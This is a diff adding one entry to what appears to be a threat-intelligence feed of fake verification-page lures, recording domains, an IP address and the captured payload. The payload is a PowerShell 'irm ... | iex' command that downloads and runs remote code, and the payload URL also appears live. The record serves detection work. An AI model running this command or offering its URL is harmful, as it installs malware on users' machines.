@@ -308,5 +308,24 @@
     ],
     "ReportId": "cmx0t770o00750oml58zddljn",
     "ScannedAt": "2026-11-28T19:34:31.551000+00:00"
+  },
+  {
+    "UrlDomain": "lockpressone.com.br",
+    "DeliveryUrl": [
+      "cfverification.com"
+    ],
+    "PayloadUrl": [
+      "https://cfverification.com/8pchkbdes5/abaa0e2b9cbc0f2d"
+    ],
+    "IP": [
+      "108.167.171.58"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://cfverification[.]com/8pchkbdes5/abaa0e2b9cbc0f2d')|iex",
+    "ResolvedDownloadUrl": [
+      "https://cfverification.com/8pchkbdes5/abaa0e2b9cbc0f2d"
+    ],
+    "ReportId": "cmx0v30tc027c0oml6hiztb1t",
+    "ScannedAt": "2026-11-28T20:27:16.125000+00:00"
   }
 ]
